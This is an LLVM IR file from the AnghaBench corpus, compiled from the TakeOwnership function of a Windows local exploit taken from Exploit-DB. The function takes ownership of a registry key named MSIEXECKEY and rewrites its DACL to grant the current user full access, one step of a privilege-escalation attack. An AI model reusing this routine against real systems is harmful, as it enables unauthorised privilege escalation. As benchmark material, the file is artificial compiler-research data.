; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43929.c_TakeOwnership.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43929.c_TakeOwnership.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_10__ = type { %struct.TYPE_9__ }
%struct.TYPE_9__ = type { i32* }
%struct.TYPE_11__ = type { %struct.TYPE_8__, i32, i32, i32 }
%struct.TYPE_8__ = type { i64, i32, i32 }

@TOKEN_ALL_ACCESS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [34 x i8] c"\0A[-] OpenProcessToken failed %d\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [33 x i8] c"\0A[+] OpenProcessToken successful\00", align 1
@TokenUser = common dso_local global i32 0, align 4
@ERROR_INSUFFICIENT_BUFFER = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [51 x i8] c"\0A[-] Failed to initialize GetTokenInformation %d\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [37 x i8] c"\0A[-] GetTokenInformation failed %d\0A\0A\00", align 1
@KEY_ALL_ACCESS = common dso_local global i32 0, align 4
@GRANT_ACCESS = common dso_local global i32 0, align 4
@SUB_CONTAINERS_AND_OBJECTS_INHERIT = common dso_local global i32 0, align 4
@TRUSTEE_IS_SID = common dso_local global i32 0, align 4
@TRUSTEE_IS_USER = common dso_local global i32 0, align 4
@ERROR_SUCCESS = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [31 x i8] c"\0A[-] SetEntriesInAcl failure\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"\0A[+] SetEntriesInAcl successful\00", align 1
@MSIEXECKEY = common dso_local global i8* null, align 8
@SE_REGISTRY_KEY = common dso_local global i32 0, align 4
@OWNER_SECURITY_INFORMATION = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [50 x i8] c"\0A[-] Failed to obtain the object's ownership %d\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"\0A[+] Ownership '%s' successful\00", align 1
@DACL_SECURITY_INFORMATION = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [45 x i8] c"\0A[-] Failed to modify the object's DACL %d\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [41 x i8] c"\0A[+] Object's DACL successfully modified\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @TakeOwnership() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.TYPE_10__*, align 8
  %3 = alloca i32*, align 8
  %4 = alloca %struct.TYPE_11__, align 8
  %5 = alloca i32, align 4
  store %struct.TYPE_10__* null, %struct.TYPE_10__** %2, align 8
  store i32* null, i32** %3, align 8
  %6 = call i32 (...) @GetCurrentProcess()
  %7 = load i32, i32* @TOKEN_ALL_ACCESS, align 4
  %8 = call i32 @OpenProcessToken(i32 %6, i32 %7, i32* %1)
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %14, label %10

10:                                               ; preds = %0
  %11 = call i32 (...) @GetLastError()
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i32 %11)
  %13 = call i32 @ExitProcess(i32 1)
  br label %14

14:                                               ; preds = %10, %0
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %1, align 4
  %17 = load i32, i32* @TokenUser, align 4
  %18 = call i32 @GetTokenInformation(i32 %16, i32 %17, %struct.TYPE_10__* null, i32 0, i32* %5)
  %19 = icmp ne i32 %18, 0
  br i1 %19, label %29, label %20

20:                                               ; preds = %14
  %21 = call i32 (...) @GetLastError()
  %22 = sext i32 %21 to i64
  %23 = load i64, i64* @ERROR_INSUFFICIENT_BUFFER, align 8
  %24 = icmp ne i64 %22, %23
  br i1 %24, label %25, label %29

25:                                               ; preds = %20
  %26 = call i32 (...) @GetLastError()
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.2, i64 0, i64 0), i32 %26)
  %28 = call i32 @ExitProcess(i32 1)
  br label %29

29:                                               ; preds = %25, %20, %14
  %30 = load i32, i32* %5, align 4
  %31 = call i64 @LocalAlloc(i32 0, i32 %30)
  %32 = inttoptr i64 %31 to %struct.TYPE_10__*
  store %struct.TYPE_10__* %32, %struct.TYPE_10__** %2, align 8
  %33 = load i32, i32* %1, align 4
  %34 = load i32, i32* @TokenUser, align 4
  %35 = load %struct.TYPE_10__*, %struct.TYPE_10__** %2, align 8
  %36 = load i32, i32* %5, align 4
  %37 = call i32 @GetTokenInformation(i32 %33, i32 %34, %struct.TYPE_10__* %35, i32 %36, i32* %5)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %43, label %39

39:                                               ; preds = %29
  %40 = call i32 (...) @GetLastError()
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0), i32 %40)
  %42 = call i32 @ExitProcess(i32 1)
  br label %43

43:                                               ; preds = %39, %29
  %44 = call i32 @ZeroMemory(%struct.TYPE_11__* %4, i32 32)
  %45 = load i32, i32* @KEY_ALL_ACCESS, align 4
  %46 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %4, i32 0, i32 3
  store i32 %45, i32* %46, align 8
  %47 = load i32, i32* @GRANT_ACCESS, align 4
  %48 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %4, i32 0, i32 2
  store i32 %47, i32* %48, align 4
  %49 = load i32, i32* @SUB_CONTAINERS_AND_OBJECTS_INHERIT, align 4
  %50 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %4, i32 0, i32 1
  store i32 %49, i32* %50, align 8
  %51 = load i32, i32* @TRUSTEE_IS_SID, align 4
  %52 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %4, i32 0, i32 0
  %53 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %52, i32 0, i32 2
  store i32 %51, i32* %53, align 4
  %54 = load i32, i32* @TRUSTEE_IS_USER, align 4
  %55 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %4, i32 0, i32 0
  %56 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %55, i32 0, i32 1
  store i32 %54, i32* %56, align 8
  %57 = load %struct.TYPE_10__*, %struct.TYPE_10__** %2, align 8
  %58 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %57, i32 0, i32 0
  %59 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %58, i32 0, i32 0
  %60 = load i32*, i32** %59, align 8
  %61 = ptrtoint i32* %60 to i64
  %62 = getelementptr inbounds %struct.TYPE_11__, %struct.TYPE_11__* %4, i32 0, i32 0
  %63 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %62, i32 0, i32 0
  store i64 %61, i64* %63, align 8
  %64 = call i64 @SetEntriesInAcl(i32 1, %struct.TYPE_11__* %4, i32* null, i32** %3)
  %65 = load i64, i64* @ERROR_SUCCESS, align 8
  %66 = icmp ne i64 %64, %65
  br i1 %66, label %67, label %70

67:                                               ; preds = %43
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0))
  %69 = call i32 @ExitProcess(i32 1)
  br label %70

70:                                               ; preds = %67, %43
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0))
  %72 = load i8*, i8** @MSIEXECKEY, align 8
  %73 = load i32, i32* @SE_REGISTRY_KEY, align 4
  %74 = load i32, i32* @OWNER_SECURITY_INFORMATION, align 4
  %75 = load %struct.TYPE_10__*, %struct.TYPE_10__** %2, align 8
  %76 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %75, i32 0, i32 0
  %77 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %76, i32 0, i32 0
  %78 = load i32*, i32** %77, align 8
  %79 = call i64 @SetNamedSecurityInfo(i8* %72, i32 %73, i32 %74, i32* %78, i32* null, i32* null, i32* null)
  %80 = load i64, i64* @ERROR_SUCCESS, align 8
  %81 = icmp ne i64 %79, %80
  br i1 %81, label %82, label %86

82:                                               ; preds = %70
  %83 = call i32 (...) @GetLastError()
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.6, i64 0, i64 0), i32 %83)
  %85 = call i32 @ExitProcess(i32 1)
  br label %86

86:                                               ; preds = %82, %70
  %87 = load i8*, i8** @MSIEXECKEY, align 8
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0), i8* %87)
  %89 = load i8*, i8** @MSIEXECKEY, align 8
  %90 = load i32, i32* @SE_REGISTRY_KEY, align 4
  %91 = load i32, i32* @DACL_SECURITY_INFORMATION, align 4
  %92 = load i32*, i32** %3, align 8
  %93 = call i64 @SetNamedSecurityInfo(i8* %89, i32 %90, i32 %91, i32* null, i32* null, i32* %92, i32* null)
  %94 = load i64, i64* @ERROR_SUCCESS, align 8
  %95 = icmp ne i64 %93, %94
  br i1 %95, label %96, label %100

96:                                               ; preds = %86
  %97 = call i32 (...) @GetLastError()
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.8, i64 0, i64 0), i32 %97)
  %99 = call i32 @ExitProcess(i32 1)
  br label %100

100:                                              ; preds = %96, %86
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.9, i64 0, i64 0))
  %102 = load i32*, i32** %3, align 8
  %103 = call i32 @LocalFree(i32* %102)
  %104 = load i32, i32* %1, align 4
  %105 = call i32 @CloseHandle(i32 %104)
  ret i32 0
}

declare dso_local i32 @OpenProcessToken(i32, i32, i32*) #1

declare dso_local i32 @GetCurrentProcess(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i32 @ExitProcess(i32) #1

declare dso_local i32 @GetTokenInformation(i32, i32, %struct.TYPE_10__*, i32, i32*) #1

declare dso_local i64 @LocalAlloc(i32, i32) #1

declare dso_local i32 @ZeroMemory(%struct.TYPE_11__*, i32) #1

declare dso_local i64 @SetEntriesInAcl(i32, %struct.TYPE_11__*, i32*, i32**) #1

declare dso_local i64 @SetNamedSecurityInfo(i8*, i32, i32, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @LocalFree(i32*) #1

declare dso_local i32 @CloseHandle(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
